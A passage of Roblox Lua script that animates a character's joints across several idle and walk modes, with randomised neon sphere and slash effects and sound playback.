								WACKYEFFECT({Time = MATHR(15,65),EffectType = "Slash", Size = VT(0,0.05,0), Size2 = VT(0.0625,0.015,0.0625)*MATHR(1,8), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-2,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(98/255 + Sick.PlaybackLoudness/1000, 37/255 + Sick.PlaybackLoudness/1000, 209/255 + Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								local FRAME = CF(VT(Torso.Position.X+MATHR(-15,15),Torso.Position.Y,Torso.Position.Z+MATHR(-15,15)))
								MagicSphere(VT(0.6,0.6,0.6),15,FRAME,"Neon orange",VT(0.1,2,0.1),0)
								MagicSphere(VT(0.2,0.2,0.2),15,FRAME,"Royal purple",VT(0.1,2,0.1),0)
								if VALUE1 == false and math.random(1,55) == 1 then
									coroutine.resume(coroutine.create(function()
										VALUE1 = true
										wait(2)
										CreateSound(333430981,RootPart,2,math.random(5, 15) / 10,false)
										for i=1,25 do
											Swait()
											FT.Parent = Torso
											FRA.Parent = RightArm
											FLA.Parent = LeftArm
											FRL.Parent = RightLeg
											FLL.Parent = LeftLeg
											for _,v in next, Character:GetDescendants() do
												if(v:IsA'DataModelMesh')then
													v.Offset = VT(math.random(-50,50)/100,math.random(-50,50)/100,math.random(-50,50)/100)
												end
											end		
										end
										VALUE1 = false
										FT.Parent = nil
										FRA.Parent = nil
										FLA.Parent = nil
										FRL.Parent = nil
										FLL.Parent = nil
										for _,v in next, Character:GetDescendants() do
											if(v:IsA'DataModelMesh')then
												v.Offset = VT(0,0,0)
											end
										end	
									end))
								end
								if MATHR(1,10) == 1 then
									Neck.C0=Clerp(Torso.Neck.C0,NECKC0*CFrame.Angles(RAD(23 + MATHR(-5,5)),RAD(MATHR(-5,5)),RAD(22 + MATHR(-5,5))),1)
								end
								if math.random(1,8) == 1 then
									Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-87498,12093847)), RAD(MATHR(-123456,3746525)), RAD(MATHR(-2134567876,98764356))), 0.15 / Animation_Speed)
								end
								if(math.random(1,4)==1)then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								end			
								if MATHR(1,10) == 1 then
									Neck.C0=Clerp(Torso.Neck.C0,NECKC0*CFrame.Angles(RAD(23 + MATHR(-5,5)),RAD(MATHR(-5,5)),RAD(22 + MATHR(-5,5))),1)
								end
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 4 + 1 * SIN(SINE / 26)) * ANGLES(RAD(-5 - 2.5*SIN(SINE/48/2)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15 - 2.5 * SIN(SINE / 12)), RAD(MATHR(-25,25)), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(140 + 5 * COS(SINE /32)), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 0.8 / 5)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(MATHR(-25,25)), RAD(-12)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(-17 + 9.4 * COS(sine / 26)), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -.5, -0.5) * ANGLES(RAD(-22 + 10.8 * COS(sine / 32)), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								if snap == 1 then
									CreateSound(363808674,Head,3,1.3,false)
									Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-100000-Sick.PlaybackLoudness/7,100000+Sick.PlaybackLoudness/7)), RAD(MATHR(-99999-Sick.PlaybackLoudness/7,99999+Sick.PlaybackLoudness/7)), RAD(MATHR(-200-Sick.PlaybackLoudness/7,48375935+Sick.PlaybackLoudness/7))), 1 / Animation_Speed) 
								end
								if MATHR(1,20+Sick.PlaybackLoudness/7) == 1 then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(MATHR(-90-Sick.PlaybackLoudness/7,90+Sick.PlaybackLoudness/7)), RAD(MATHR(-30-Sick.PlaybackLoudness/7,30+Sick.PlaybackLoudness/7)), RAD(MATHR(-50-Sick.PlaybackLoudness/7,50+Sick.PlaybackLoudness/7)))* RIGHTSHOULDERC0, 1 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(MATHR(-10000-Sick.PlaybackLoudness/7,10000+Sick.PlaybackLoudness/7)), RAD(MATHR(-900-Sick.PlaybackLoudness/7,900+Sick.PlaybackLoudness/7)), RAD(MATHR(-20-Sick.PlaybackLoudness/7,20+Sick.PlaybackLoudness/7)))* LEFTSHOULDERC0, 1 / Animation_Speed)
								end						
							elseif MODE == 18 then
								if VALUE1 == false and math.random(1,55) == 1 then
									coroutine.resume(coroutine.create(function()
										VALUE1 = true
										wait(2)
										CreateSound(333430981,RootPart,2,math.random(5, 15) / 10,false)
										for i=1,25 do
											Swait()
											FT.Parent = Torso
											FRA.Parent = RightArm
											FLA.Parent = LeftArm
											FRL.Parent = RightLeg
											FLL.Parent = LeftLeg
											for _,v in next, Character:GetDescendants() do
												if(v:IsA'DataModelMesh')then
													v.Offset = VT(math.random(-50,50)/100,math.random(-50,50)/100,math.random(-50,50)/100)
												end
											end		
										end
										VALUE1 = false
										FT.Parent = nil
										FRA.Parent = nil
										FLA.Parent = nil
										FRL.Parent = nil
										FLL.Parent = nil
										for _,v in next, Character:GetDescendants() do
											if(v:IsA'DataModelMesh')then
												v.Offset = VT(0,0,0)
											end
										end	
									end))
								end
								if(math.random(1,4)==1)then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								end	
								if math.random(1,25) == 1 then
									Neck.C0 = Clerp(Neck.C0,NECKC0*CF(0,0,0+((1)-1))*ANGLES(math.rad(math.random(-10000,10000)),math.rad(math.random(-10000,10000)),math.rad(math.random(-10000,10000))),1.5/Animation_Speed)
								end	
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 2 + 1 * COS(SINE / 18)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed) 
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(160 + 4 * COS(SINE / 62)), RAD(0), RAD(15 - 3 * COS(SINE / 12))) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(0), RAD(0), RAD(-15 + 3 * COS(SINE / 12))) * LEFTSHOULDERC0, 1 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(-17 + 9.4 * COS(sine / 26)), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -.5, -0.5) * ANGLES(RAD(-22 + 10.8 * COS(sine / 32)), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								if MATHR(1,20+Sick.PlaybackLoudness/7) == 1 then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(MATHR(-90-Sick.PlaybackLoudness/7,90+Sick.PlaybackLoudness/7)), RAD(MATHR(-30-Sick.PlaybackLoudness/7,30+Sick.PlaybackLoudness/7)), RAD(MATHR(-50-Sick.PlaybackLoudness/7,50+Sick.PlaybackLoudness/7)))* RIGHTSHOULDERC0, 1 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(MATHR(-10000-Sick.PlaybackLoudness/7,10000+Sick.PlaybackLoudness/7)), RAD(MATHR(-900-Sick.PlaybackLoudness/7,900+Sick.PlaybackLoudness/7)), RAD(MATHR(-20-Sick.PlaybackLoudness/7,20+Sick.PlaybackLoudness/7)))* LEFTSHOULDERC0, 1 / Animation_Speed)
								end
								if(math.random(1,4)==1)then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								end	
							elseif MODE == 19 then
								if(math.random(1,4)==1)then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								end	
								if math.random(1,25) == 1 then
									Neck.C0 = Clerp(Neck.C0,NECKC0*CF(0,0,0+((1)-1))*ANGLES(math.rad(math.random(-10000,10000)),math.rad(math.random(-10000,10000)),math.rad(math.random(-10000,10000))),1.5/Animation_Speed)
								end	
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.1 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0+MATHR(-5,5)), RAD(0+MATHR(-5,5)), RAD(0+MATHR(-5,5))), 0.35 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(MATHR(-25,25)), RAD(12)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(20), RAD(-20)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(-3), RAD(0), RAD(0)), 1 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(-3), RAD(0), RAD(0)), 1 / Animation_Speed)
								if MATHR(1,20+Sick.PlaybackLoudness/7) == 1 then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(MATHR(-90-Sick.PlaybackLoudness/7,90+Sick.PlaybackLoudness/7)), RAD(MATHR(-30-Sick.PlaybackLoudness/7,30+Sick.PlaybackLoudness/7)), RAD(MATHR(-50-Sick.PlaybackLoudness/7,50+Sick.PlaybackLoudness/7)))* RIGHTSHOULDERC0, 1 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(MATHR(-10000-Sick.PlaybackLoudness/7,10000+Sick.PlaybackLoudness/7)), RAD(MATHR(-900-Sick.PlaybackLoudness/7,900+Sick.PlaybackLoudness/7)), RAD(MATHR(-20-Sick.PlaybackLoudness/7,20+Sick.PlaybackLoudness/7)))* LEFTSHOULDERC0, 1 / Animation_Speed)
								end
								if(math.random(1,2)==1)then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999)), RAD(MATHR(-99999999,99999999))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								end
							elseif MODE == 20 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 2 + 1 * COS(SINE / 18)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed) 
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(160 + 4 * COS(SINE / 62)), RAD(0), RAD(15 - 3 * COS(SINE / 12))) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(0), RAD(0), RAD(-15 + 3 * COS(SINE / 12))) * LEFTSHOULDERC0, 1 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(-17 + 9.4 * COS(sine / 26)), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -.5, -0.5) * ANGLES(RAD(-22 + 10.8 * COS(sine / 32)), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
								if MATHR(1,32+Sick.PlaybackLoudness/7) == 1 then
									Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-100000-Sick.PlaybackLoudness/7,100000+Sick.PlaybackLoudness/7)), RAD(MATHR(-99999-Sick.PlaybackLoudness/7,99999+Sick.PlaybackLoudness/7)), RAD(MATHR(-200-Sick.PlaybackLoudness/7,48375935+Sick.PlaybackLoudness/7))), 1 / Animation_Speed) 
								end
								if MATHR(1,20+Sick.PlaybackLoudness/7) == 1 then
									RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(MATHR(-90-Sick.PlaybackLoudness/7,90+Sick.PlaybackLoudness/7)), RAD(MATHR(-30-Sick.PlaybackLoudness/7,30+Sick.PlaybackLoudness/7)), RAD(MATHR(-50-Sick.PlaybackLoudness/7,50+Sick.PlaybackLoudness/7)))* RIGHTSHOULDERC0, 1 / Animation_Speed)
									LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5 + 0.05 * SIN(SINE / 12), 0) * ANGLES(RAD(MATHR(-10000-Sick.PlaybackLoudness/7,10000+Sick.PlaybackLoudness/7)), RAD(MATHR(-900-Sick.PlaybackLoudness/7,900+Sick.PlaybackLoudness/7)), RAD(MATHR(-20-Sick.PlaybackLoudness/7,20+Sick.PlaybackLoudness/7)))* LEFTSHOULDERC0, 1 / Animation_Speed)
								end
							end
						elseif TORSOVELOCITY > 1 and HITFLOOR ~= nil and ATTACK == false then
							ANIM = "Walk"
							DOUBLED = false
							READYTODOUBLE = false
							if MODE == 1 then
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.25,-0.5)*ANGLES(math.rad(0),math.rad(90),math.rad(0))*ANGLES(math.rad(-2.5),math.rad(0),math.rad(-20)),.2)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0)*ANGLES(math.rad(0),math.rad(-90),math.rad(0))*ANGLES(math.rad(-2.5),math.rad(0),math.rad(20)),.2)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0*CFrame.new(0,-0.5,0.5 + 0.1 * math.cos(sine / 28))*ANGLES(math.rad(75),math.rad(0),math.rad(0)),.2)
								Neck.C0 = Clerp(Neck.C0,NECKC0*ANGLES(math.rad(-20),math.rad(0),math.rad(0)),.2)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1,.5,-.25)*CFrame.Angles(0,math.rad(-10),math.rad(-90))*Welds.Defaults.RightShoulder.C0,.25)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0)*ANGLES(math.rad(-30),math.rad(0),math.rad(-30 - 2.5 * math.cos(sine / 28))),.2)
							elseif MODE == 2 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(5), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-15, 25) - 2.5 * SIN(sine / 12)), RAD(MATHR(-15, 25)), RAD(MATHR(-15, 25))), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.55, 0.5, 0.5) * ANGLES(RAD(250), RAD(20), RAD(-80))* RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-35 * COS(sine / 18)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1 - 0.15 * COS(sine / 18), -0.2+ 0.2 * COS(sine / 18)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.15 * COS(sine / 18), -0.2+ -0.2 * COS(sine / 18)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
							elseif MODE == 3 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(5), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-15, 25) - 2.5 * SIN(SINE / 12)), RAD(MATHR(-15, 25)), RAD(MATHR(-15, 25))), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.55, 0.5, 0.5) * ANGLES(RAD(250), RAD(20), RAD(-80))* RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-35 * COS(SINE / 18)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1 - 0.15 * COS(SINE / 18), -0.2+ 0.2 * COS(SINE / 18)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.15 * COS(SINE / 18), -0.2+ -0.2 * COS(SINE / 18)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)	
							elseif MODE == 4 or MODE == 5 then
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(5), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0+MATHR(-15,15)), RAD(0+MATHR(-15,15)), RAD(0+MATHR(-15,15))), 0.35 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(60 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 0.35 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-60 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(0)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
							elseif MODE == 6 then
								RootJoint.C0 = Clerp(RootJoint.C0,Welds.Defaults.RootJoint.C0*CFrame.new(0,0,-0.1+0.15* math.sin(sine / 3)*S)*CFrame.Angles(math.rad(15+3 * math.cos(sine / 3)),0,0),.25)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(sine / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.55, 0.5, 0.5) * ANGLES(RAD(250), RAD(20), RAD(-80))* RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5*S,.5*S,0)*CFrame.Angles(math.rad(0 + 70 * math.sin(sine / 6)),0,math.rad(-5))*Welds.Defaults.LeftShoulder.C0,.25)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1*S,-1*S,0)*CFrame.Angles(math.rad(5 + 70 * math.sin(sine / 6)),math.rad(90),math.rad(5)),.25)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1*S,-1*S,0)*CFrame.Angles(math.rad(5 - 70 * math.sin(sine / 6)),math.rad(-90),math.rad(-5)),.25)
							elseif MODE == 7 then
								RootJoint.C0 = Clerp(RootJoint.C0,Welds.Defaults.RootJoint.C0*CFrame.new(.5*math.cos(sine/50),0,-.5*math.sin(sine/50))*CFrame.Angles(math.rad(40),0,0),.25)
								Neck.C0 = Clerp(Neck.C0,Welds.Defaults.Neck.C0*CFrame.new(0,-.25,0)*CFrame.Angles(math.rad(-40),0,0),.25)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CFrame.new(1.55, 0.5, 0.5) * CFrame.Angles(math.rad(250), math.rad(20), math.rad(-80))* RIGHTSHOULDERC0, 1 / 3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,.5,0)*CFrame.Angles(math.rad(-45),0,math.rad(-5-2*math.cos(sine/19)))*Welds.Defaults.LeftShoulder.C0,.25)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-.5,-.5)*CFrame.Angles(math.rad(-20+9*math.cos(sine/74)),math.rad(80),0)*CFrame.Angles(math.rad(5*math.cos(sine/37)),0,0),.25)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0)*CFrame.Angles(math.rad(-20-9*math.cos(sine/54)),math.rad(-80),0)*CFrame.Angles(math.rad(-5*math.cos(sine/41)),0,0),.25)
							elseif MODE == 8 then
								Speed = 25
								WACKYEFFECT({TIME = MATHR(15,25)*2, EffectType = "Sphere", Size = VT(3 + 2 * COS(SINE/4),3 + 2 * COS(SINE/4),3 + 2 * COS(SINE/4)), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = -11, CFrame = CF(RootPart.Position-VT(MATHR(-20,20),2,MATHR(-20,20))), MoveToPos = Torso.Position+VT(0,MATHR(45,145)/1.5,0), RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0,math.random(0,255),0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({TIME = MATHR(0,22), EffectType = "Sphere", Size = VT(2 + 2 * COS(SINE/4),5 + 2 * COS(SINE/4),2 + 2 * COS(SINE/4)), Size2 = VT(-3,-6,-4), Transparency = 0, Transparency2 = 1, CFrame = RightArm.CFrame*CF(0,-1,0) * ANGLES(RAD(MATHR(-360,360)), RAD(MATHR(-360,360)), RAD(MATHR(-360,360))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-22,22), RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0,math.random(0,255),0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({Time = MATHR(15,65),EffectType = "Slash", Size = VT(0,0.05,0), Size2 = VT(0.0625,0.015,0.0625)*MATHR(1,8), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-2,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0,math.random(0,255),0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})	
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1 + 0.25 * COS(SINE / 28)) * ANGLES(RAD(25+2.5*COS(SINE/28)), RAD(0), RAD(0)), 1 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0,NECKC0*CF(0,0,0+((1)-1))*ANGLES(RAD(-5+3.4*COS(SINE/28)),RAD(3*COS(SINE/28)),RAD(0)),1/Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CF(1.5, 0.5, 0)*ANGLES(RAD(-90-5*COS(SINE/28)),RAD(0),RAD(0))* RIGHTSHOULDERC0,1/Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-.75, 0.5, -.7) * ANGLES(RAD(0), RAD(0), RAD(90)) * LEFTSHOULDERC0, 1 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1-.05*COS(SINE / 28), -0.01) * ANGLES(RAD(-4), RAD(80), RAD(0)) * ANGLES(RAD(-8-2.5*COS(SINE/28)), RAD(0), RAD(0)), 1 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -.5-.05*COS(SINE  / 28), -0.5) * ANGLES(RAD(-8), RAD(-80), RAD(0)) * ANGLES(RAD(-8-2.5*COS(SINE/28)), RAD(0), RAD(0)), 1 / Animation_Speed)
								snap = math.random(1,72)
								if snap == 1 then
									CreateSound(406913243,Head,3,1.3,false)
									Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-100000-Sick.PlaybackLoudness/7,100000+Sick.PlaybackLoudness/7)), RAD(MATHR(-99999-Sick.PlaybackLoudness/7,99999+Sick.PlaybackLoudness/7)), RAD(MATHR(-200-Sick.PlaybackLoudness/7,48375935+Sick.PlaybackLoudness/7))), 1 / Animation_Speed) 
								end						
							elseif MODE == 9 then
								Speed = 16
								local FRAME = CF(VT(Torso.Position.X+MATHR(-15,15),Torso.Position.Y,Torso.Position.Z+MATHR(-15,15)))
								MagicSphere(VT(0.6,0.6,0.6),15,FRAME,"Royal purple",VT(0.1,2,0.1),0)
								MagicSphere(VT(0.2,0.2,0.2),15,FRAME,"Really black",VT(0.1,2,0.1),0)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(5), RAD(0), RAD(0)), 0.15 / Animation_Speed)
